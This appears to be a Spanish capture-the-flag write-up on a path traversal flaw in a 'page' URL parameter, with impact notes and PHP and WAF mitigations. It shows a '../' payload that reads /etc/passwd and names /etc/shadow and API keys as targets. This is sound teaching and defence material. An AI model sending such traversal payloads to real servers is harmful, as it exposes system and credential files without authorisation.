# A5 - Path Traversal (Directory Traversal)

Vulnerabilidad del OWASP Top 10 (2017), clasificada dentro de A5: Broken Access Control. El parámetro `page` de la URL carga archivos directamente en el servidor sin validar la ruta, permitiendo escapar del directorio previsto con secuencias `../`.

---

## Pasos para obtener la flag

### 1. Identificar el vector

El parámetro `page` carga recursos del servidor:
```
http://<IP>/?page=<ruta>
```

### 2. Explotar

Usar `../` repetidas veces para llegar a la raíz del sistema y acceder a archivos sensibles:
```
http://<IP>/?page=../../../../../../../etc/passwd
```

Cada `../` sube un nivel en la jerarquía de directorios:
```
/var/www/html/ → /var/www/ → /var/ → / → /etc/passwd
```

El servidor carga el archivo solicitado sin validar la ruta y devuelve la **flag**.

---

## Impacto

- **Divulgación de información:** lectura de `/etc/passwd`, `/etc/shadow`, archivos de configuración, claves API.
- **Bypass de control de acceso:** eludir restricciones sobre qué archivos puede acceder el usuario.
- **Reconocimiento del sistema:** mapeo de la estructura de directorios.
- **Escalada de privilegios:** información útil para preparar ataques posteriores.

---

## Mitigación

1. **Validar y sanitizar rutas en servidor:**
   ```php
   $page = basename($_GET['page']);
   $safe_path = realpath('./pages/' . $page . '.php');
   if (strpos($safe_path, realpath('./pages/')) !== 0) die('Acceso denegado');
   include($safe_path);
   ```
2. **Whitelist de páginas permitidas:** solo aceptar identificadores conocidos, nunca rutas libres.
3. **Bloquear caracteres peligrosos:** rechazar `..`, `/` y `\` en el parámetro.
4. **Configurar `open_basedir` en PHP** para limitar el acceso a un directorio específico.
5. **Permisos restrictivos en el filesystem:** archivos sensibles fuera del webroot y sin lectura por el proceso web.
6. **WAF:** reglas para bloquear `../`, `%2e%2e` y accesos a rutas como `/etc/passwd`.
